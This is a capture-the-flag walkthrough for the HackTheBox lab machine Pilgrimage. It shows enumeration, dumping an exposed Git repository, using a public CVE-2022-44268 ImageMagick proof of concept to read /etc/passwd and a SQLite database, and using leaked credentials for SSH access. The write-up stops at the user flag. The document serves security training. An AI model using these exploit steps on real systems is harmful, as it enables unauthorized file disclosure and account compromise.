# HTB_Pilgrimage

## Synopsis
Pilgrimage is a Linux-based machine rated as easy difficulty, centered around a web application that exposes a Git repository. Upon analyzing the retrieved source code and file structure, a vulnerable version of ImageMagick is discovered—allowing arbitrary file reads by injecting a specially crafted tEXt chunk into a PNG image. This flaw is exploited to extract a SQLite database containing plaintext credentials, which are then used to gain SSH access to the system. Further enumeration uncovers a root-owned Bash script that executes a compromised version of Binwalk. By crafting another malicious PNG, the CVE-2022-4510 vulnerability is exploited to achieve Remote Code Execution (RCE) as root.

---

## Skills Required
- Basics of Web enumeration  
- Basics of Linux enumeration  

## Skills Learned
- Rudimentary source code review  
- Basic scripting  
- Structure of PNG files  

---

## Enumeration

### Nmap
An initial Nmap scan reveals SSH and Nginx services running on their respective default ports.  
The domain `pilgrimage.htb` is revealed, which we add to our hosts file.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.219 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.219
pgsql

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Feroxbuster
We run a feroxbuster scan to enumerate potentially exposed directories and endpoints.



feroxbuster --url http://pilgrimage.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt


Found: 
http://pilgrimage.htb/.git/
http://pilgrimage.htb/.git/logs/
http://pilgrimage.htb/assets/
http://pilgrimage.htb/assets/css/
http://pilgrimage.htb/assets/images/
http://pilgrimage.htb/assets/js/
http://pilgrimage.htb/tmp/
http://pilgrimage.htb/vendor/
http://pilgrimage.htb/vendor/jquery/
Git Dumper
The scan reveals an exposed .git directory. We use git-dumper to dump and recreate the repository.

git-dumper http://pilgrimage.htb/ ./pilgrimage_source

[+] Fetching http://pilgrimage.htb/.git/objects/...
[+] Running git checkout .
Foothold
The repository contains a custom ImageMagick binary:

./magick --version


Version: ImageMagick 7.1.0-49 beta
This version is vulnerable to CVE-2022-44268 (Arbitrary File Read via PNG tEXt chunk).

We use the following PoC:

git clone https://github.com/voidz0r/CVE-2022-44268.git
cd CVE-2022-44268
cargo run "/etc/passwd"
Identifying the Malicious PNG

identify -verbose image.png

png:text: 1 tEXt/zTXt/iTXt chunks were found
profile: /etc/passwd
After uploading the image and retrieving the modified version:


identify -verbose 64f59dc103cbb.png

Raw profile type:
726f6f743a783a30...
Extracting Data with Python
We decode the hex-encoded data from the image:

python3 -c 'print(bytes.fromhex("726f6f743a783a30..."))'

root:x:0:0:root:/root:/bin/bash
emily:x:1000:1000:emily:/home/emily:/bin/bash
...
SQLite DB Extraction
From the downloaded repo we find:

$db = new PDO('sqlite:/var/db/pilgrimage');
We exploit again, this time targeting the SQLite DB path:


cargo run "/var/db/pilgrimage"
Convert the hex data into an SQLite file:

with open("hex", "rb") as f:
    data = bytes.fromhex(f.read().decode())
with open("sql.db", "wb") as f:
    f.write(data)
Verify it's a valid DB:

file sql.db
pgsql

sql.db: SQLite 3.x database
Accessing Credentials


sqlite3 sql.db
sql

.tables
images  users

SELECT * FROM users;

emily|abigchonkyboi123
SSH Access
bash

ssh emily@pilgrimage.htb

Linux pilgrimage 5.10.0-23-amd64

emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
User flag can be found in /home/emily/user.txt
